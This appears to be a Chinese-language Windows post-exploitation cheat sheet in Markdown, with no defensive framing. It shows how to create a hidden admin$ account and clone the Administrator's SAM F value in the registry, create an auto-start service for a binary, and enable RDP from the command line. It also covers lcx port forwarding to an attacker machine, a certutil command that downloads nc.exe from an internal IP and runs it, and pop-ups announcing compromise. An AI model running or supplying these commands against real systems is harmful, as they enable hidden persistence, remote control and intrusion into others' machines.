# Windows

### 自动登录设置

```angular2html
control userpasswords2

```

### Windows注册表添加账户

> 使用命令 `net user admin$ admin /add`添加账户
>
> 使用命令 `net localgroup administrators admin$ /add`添加进管理员组
>
> 使用命令 `regedit`打开注册表，跳转到 `HKEY_LOACL_MACHINE\SAM\SAM` 发现没有展开项，需要修改权限为 `当前用户-完全控制`
> 
> 然后将继续展开 `Domains\Account\Users` 找到添加的账户导出注册表，找到对应制的F替换成Administrator账户的F值，导出
>

### 创建服务
```angular2html
sc create 服务名称 start= auto binPath= "C:\haya.exe"
```
### 删除服务
````angular2html
sc delete 服务名称
````
### 命令行开启3389(远程桌面)
```angular2html
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

### 端口转发
```angular2html
端口转发：
lcx -listen <监听slave请求的端口> <等待连接的端口>
lcx -slave <攻击机ip> <监听端口> <目标ip> <目标端口>
端口映射：
lcx -tran <等待连接的端口> <目标ip> <目标端口>
```

### 命令行下载文件并运行
```angular2html
Windows Server 2008 R2(已测试)

certutil.exe -urlcache -split -f http://10.2.7.16/nc12.exe C:/nc.exe&cmd.exe /c C:/nc.exe
```

### cmd弹窗(两种方式)
```angular2html

mshta vbscript:msgbox("你好，你的电脑存在高危漏洞我已经获取到你的电脑权限，请立即联系本单位网络管理员",64,"高危漏洞！！！！")(window.close)

MSG /server:127.0.0.1 * "你好，你的电脑存在高危漏洞，我已经获取到权限，请及时修复"
```
